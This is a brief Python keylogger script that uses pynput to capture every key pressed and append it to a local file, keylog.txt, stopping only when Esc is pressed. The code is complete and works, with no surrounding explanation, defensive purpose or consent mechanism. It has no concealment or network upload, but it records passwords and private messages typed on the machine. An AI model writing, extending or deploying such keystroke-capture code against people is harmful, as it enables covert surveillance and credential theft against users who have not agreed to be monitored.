from pynput.keyboard import Key, Listener

log_file = "keylog.txt"


def on_press(key):
    with open(log_file, "a") as file:
        try:
            file.write(f'{key.char}')
        except AttributeError:
            # Special keys are logged as their names
            file.write(f'[{key}]')


def on_release(key):
    if key == Key.esc:
        # Stop listener when Esc key is pressed
        return False


# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
